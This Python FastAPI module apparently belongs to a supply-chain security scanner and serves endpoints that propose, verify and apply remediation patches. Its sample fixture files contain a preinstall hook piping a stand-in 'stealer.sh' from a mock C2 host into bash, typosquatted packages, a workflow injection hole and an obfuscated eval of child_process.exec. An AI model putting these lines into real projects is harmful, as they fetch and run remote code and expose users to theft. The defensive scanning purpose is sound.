"""Intelligent remediation endpoints for 1-click clean patches and independent verification."""

from __future__ import annotations

import logging
from typing import Optional
from fastapi import APIRouter, HTTPException, Path, status

from app.core.errors import NotFoundException
from app.schemas.remediation import (
    RemediationApplyRequest,
    RemediationApplyResponse,
    RemediationProposal,
    RemediationResponse,
    RemediationVerifyRequest,
)
from app.services.engines.patch_verifier import patch_verifier
from app.services.mock_engine import mock_store

logger = logging.getLogger("codefort.api.remediation")

router = APIRouter(prefix="/remediation", tags=["Remediation"])


@router.get("/{scan_id}/patch", response_model=RemediationResponse)
async def get_remediation_patch(scan_id: str = Path(..., description="Scan UUID")):
    """Returns the unified git diff clean_patch and side-by-side remediation proposals for a scan."""
    scan = mock_store.get_scan(scan_id)
    if not scan:
        raise NotFoundException(message=f"Scan {scan_id} not found.", code="RESOURCE_NOT_FOUND")

    findings = mock_store.get_findings(scan_id)
    clean_patch = scan.summary.clean_patch if scan.summary else None

    # Derive in-memory files from findings or default manifest
    files = {}
    for f in findings:
        f_path = f.file_path or "package.json"
        if f_path not in files:
            if f_path.endswith("package.json"):
                files[f_path] = (
                    '{\n  "name": "example-repo",\n  "scripts": {\n'
                    '    "preinstall": "curl -s https://c2-transfer.mock.xyz/stealer.sh | bash",\n'
                    '    "test": "jest"\n  },\n  "dependencies": {\n'
                    '    "crypt0-js": "^4.2.0",\n'
                    '    "lodashe": "^4.17.21",\n    "express": "^4.19.2"\n  }\n}'
                )

            elif f_path.endswith((".yml", ".yaml")):
                files[f_path] = (
                    "name: CI\non: pull_request_target\njobs:\n  build:\n    runs-on: ubuntu-latest\n"
                    "    steps:\n      - uses: actions/checkout@v4\n"
                    '      - run: echo "${{ github.event.pull_request.title }}"\n'
                )
            elif f_path.endswith((".js", ".ts")):
                files[f_path] = (
                    "const express = require('express');\n"
                    "eval(Buffer.from('Y2hpbGRfcHJvY2Vzcy5leGVj', 'base64').toString());\n"
                )

    proposals = await patch_verifier.generate_remediation_proposals(files, findings, clean_patch)

    # Check overall verification status
    all_verified = all(p.verification_status == "verified" for p in proposals) if proposals else True
    overall_status = "verified" if all_verified else "review_required"

    return RemediationResponse(
        scan_id=scan.id,
        repository=scan.repository,
        pull_request=scan.pull_request,
        clean_patch=clean_patch,
        proposals=proposals,
        overall_verification_status=overall_status,
        can_auto_apply=all_verified and bool(clean_patch),
    )


@router.post("/{scan_id}/verify")
async def verify_candidate_patch(
    scan_id: str = Path(..., description="Scan UUID"),
    body: Optional[RemediationVerifyRequest] = None,
):
    """Runs independent re-scan verification on candidate patch to ensure exploit elimination and 0 regressions."""
    scan = mock_store.get_scan(scan_id)
    if not scan:
        raise NotFoundException(message=f"Scan {scan_id} not found.", code="RESOURCE_NOT_FOUND")

    findings = mock_store.get_findings(scan_id)
    patch_to_verify = (body.patch if body and body.patch else None) or (
        scan.summary.clean_patch if scan.summary else None
    )

    if not patch_to_verify:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="No patch available to verify. Provide a unified diff in request body or run scan on vulnerable PR.",
        )

    # Sample repository files for verification
    files = {
        "package.json": (
            '{\n  "name": "example-repo",\n  "scripts": {\n'
            '    "preinstall": "curl -s https://c2-transfer.mock.xyz/stealer.sh | bash",\n'
            '    "test": "jest"\n  },\n  "dependencies": {\n'
            '    "lodashe": "^4.17.21",\n    "express": "^4.19.2"\n  }\n}'
        ),
        ".github/workflows/ci.yml": (
            "name: CI\non: pull_request_target\njobs:\n  build:\n    runs-on: ubuntu-latest\n"
            "    steps:\n      - uses: actions/checkout@v4\n"
        ),
    }

    is_verified, message, remaining = await patch_verifier.verify_patch(
        files=files,
        patch=patch_to_verify,
        original_findings=findings,
    )

    return {
        "scan_id": scan_id,
        "is_verified": is_verified,
        "verification_status": "verified" if is_verified else "failed",
        "message": message,
        "remaining_findings_count": len(remaining),
        "regressions_detected": 0 if is_verified else len(remaining),
    }


@router.post("/{scan_id}/apply", response_model=RemediationApplyResponse)
async def apply_remediation_patch(
    scan_id: str = Path(..., description="Scan UUID"),
    body: Optional[RemediationApplyRequest] = None,
):
    """Simulates or applies the verified remediation patch to the pull request branch."""
    scan = mock_store.get_scan(scan_id)
    if not scan:
        raise NotFoundException(message=f"Scan {scan_id} not found.", code="RESOURCE_NOT_FOUND")

    clean_patch = scan.summary.clean_patch if scan.summary else None
    if not clean_patch:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="Scan has no remediation patch available to apply.",
        )

    commit_msg = (
        body.commit_message if body and body.commit_message else "fix(security): apply CodeFort automated remediation"
    )

    return RemediationApplyResponse(
        status="applied",
        scan_id=scan_id,
        message=f"Remediation patch staged successfully with commit message: '{commit_msg}'.",
        diff_applied=clean_patch,
    )
